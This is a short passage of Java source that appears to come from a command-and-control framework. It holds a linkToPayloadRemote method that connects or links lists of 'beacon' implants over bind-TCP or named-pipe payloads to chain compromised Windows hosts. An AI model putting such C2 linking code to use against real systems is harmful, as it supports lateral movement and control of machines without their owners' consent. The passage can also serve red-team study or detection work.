                ConnectExplicit(this.bids[i], "127.0.0.1", scListener.getPort());
        }
    }

    public void linkToPayloadRemote(ScListener scListener, String string) {
        if (".".equals(string)) {
            linkToPayloadLocal(scListener);
        } else if ("windows/beacon_bind_pipe".equals(scListener.getPayload())) {
            Pause(1000);
            for (int i = 0; i < this.bids.length; i++)
                LinkExplicit(this.bids[i], scListener.getPipeName(string));
        } else if ("windows/beacon_bind_tcp".equals(scListener.getPayload())) {
            Pause(1000);
            for (int i = 0; i < this.bids.length; i++)
                ConnectExplicit(this.bids[i], string, scListener.getPort());
        }
    }
}
